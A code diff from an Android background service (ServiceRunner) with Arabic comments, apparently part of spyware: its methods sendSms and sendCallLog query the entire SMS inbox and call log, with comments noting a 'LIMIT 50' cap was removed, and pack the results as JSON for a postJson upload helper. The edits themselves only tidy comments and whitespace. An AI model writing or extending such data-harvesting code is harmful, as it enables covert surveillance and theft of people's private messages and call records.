@@ -713,7 +713,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ sendSms (بدون LIMIT) ★★★
+    // sendSms (بدون LIMIT)
     // ============================================================
     private void sendSms() {
         try {
@@ -722,7 +722,6 @@ public class ServiceRunner extends Service {
                 return;
             }
             JSONArray arr = new JSONArray();
-            // ★ إزالة "LIMIT 50" من الـ query ★
             Cursor c = getContentResolver().query(
                     Uri.parse("content://sms/inbox"),
                     null, null, null,
@@ -757,7 +756,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ sendCallLog (بدون LIMIT) ★★★
+    // sendCallLog (بدون LIMIT)
     // ============================================================
     private void sendCallLog() {
         try {
@@ -766,7 +765,6 @@ public class ServiceRunner extends Service {
                 return;
             }
             JSONArray arr = new JSONArray();
-            // ★ إزالة "LIMIT 50" من الـ query ★
             Cursor c = getContentResolver().query(
                     CallLog.Calls.CONTENT_URI,
                     null, null, null,
@@ -2024,4 +2022,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-}
+                    }
